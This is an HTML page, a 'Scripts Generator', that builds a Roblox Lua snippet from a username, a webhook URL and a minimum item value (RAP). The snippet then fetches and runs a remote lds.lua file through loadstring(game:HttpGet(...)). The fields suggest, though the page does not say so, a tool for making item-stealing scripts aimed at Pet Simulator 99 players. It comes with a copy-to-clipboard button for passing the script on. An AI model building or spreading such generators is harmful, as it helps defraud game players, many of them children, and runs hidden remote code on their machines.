<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Argon X Scripts</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
  <style>
    /* Global Styles */
    body {
      font-family: Arial, sans-serif;
      background-color: #000000; /* Dark background */
      text-align: center;
      padding: 50px;
    }

    /* Container Styles */
    .container {
      background-color: #ffffff;
      padding: 20px;
      border-radius: 8px;
      display: inline-block;
      width: 90%;
      max-width: 500px;
    }

    /* Input Field Styles */
    .input-field {
      margin: 10px 0;
    }

    /* Button Styles */
    button {
      padding: 10px 20px;
      background-color: #ffffff; /* Purple button background */
      color: #ffffff; /* White button text */
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #5c3c8a; /* Darker purple button hover */
    }

    /* Output Styles */
    #output {
      text-align: left;
      white-space: pre-wrap;
    }

    /* Textarea Styles */
    textarea {
      width: 100%;
      height: 150px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Argon X Scripts Generator!</h1>
    <form onsubmit="return false;"> <!-- Prevent form submission -->
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br><br>
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="webhook"><br><br>
      <label for="minimumRAP">Minimum RAP:</label>
      <input type="number" id="minimumRAP" name="minimumRAP"><br><br>
      <button type="button" onclick="generateOutput()">Generate</button>
      <textarea id="output" readonly></textarea><br><br>
      <button type="button" onclick="copyToClipboard()">Copy to Clipboard</button>
    </form>
  </div>

  <script>
    function generateOutput() {
      const username = document.getElementById("username").value;
      const webhook = document.getElementById("webhook").value;
      const minimumRAP = document.getElementById("minimumRAP").value;

      // Log values for debugging
      console.log("Username:", username);
      console.log("Webhook:", webhook);
      console.log("Minimum RAP:", minimumRAP);

      if (!username || !webhook || !minimumRAP) {
        alert("Please fill in all fields.");
        return;
      }

      const outputString = `_G.Username = "${username}"\n` +
                           `_G.Webhook = "${webhook}"\n` +
                           `_G.MinimumRAP = ${minimumRAP}\n` +
                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';

      document.getElementById("output").value = outputString;
    }

    function copyToClipboard() {
      const copyText = document.getElementById("output");
      copyText.select();
      copyText.setSelectionRange(0, 99999); /* For mobile devices */
      document.execCommand("copy");
      alert("Copied to clipboard!");
    }
  </script>
</body>
</html>
